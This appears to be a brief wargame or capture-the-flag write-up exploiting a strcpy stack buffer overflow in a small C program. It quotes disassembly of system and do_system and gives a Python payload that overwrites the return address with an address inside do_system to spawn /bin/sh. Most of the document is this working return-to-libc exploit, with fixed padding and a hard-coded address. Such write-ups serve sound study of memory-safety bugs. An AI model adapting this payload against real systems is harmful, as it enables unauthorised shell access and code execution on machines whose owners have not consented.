# Vulnerability
```
char buffer[256];
strcpy(buffer, temp);
```
This program uses strcpy function that does not checks boundary.

# Exploitation
I will use `do_system` function which called by `system` function:
```
0x007507fe <system+62>:	jmp    0x750320 <do_system>
0x00750803 <system+67>:	lea    0xffff4617(%ebx),%eax
0x00750809 <system+73>:	call   0x750320 <do_system>
```
When disassembly `do_system`, You can see assembly code setting parameter with program's name and `/bin/sh`:
```
0x00750784 <do_system+1124>:	mov    0xfffffec4(%ebx),%ecx
0x0075078a <do_system+1130>:	xor    %edx,%edx
0x0075078c <do_system+1132>:	xor    %eax,%eax
0x0075078e <do_system+1134>:	mov    %edx,0x16bc(%ebx)
0x00750794 <do_system+1140>:	lea    0xffff460f(%ebx),%edx
```
So I will give ret address to that point.

# Payload
```python
import os

payload = ""
payload += "A"*264
payload += "B"*4
payload += "\x84\x07\x75\x00"

print payload
```
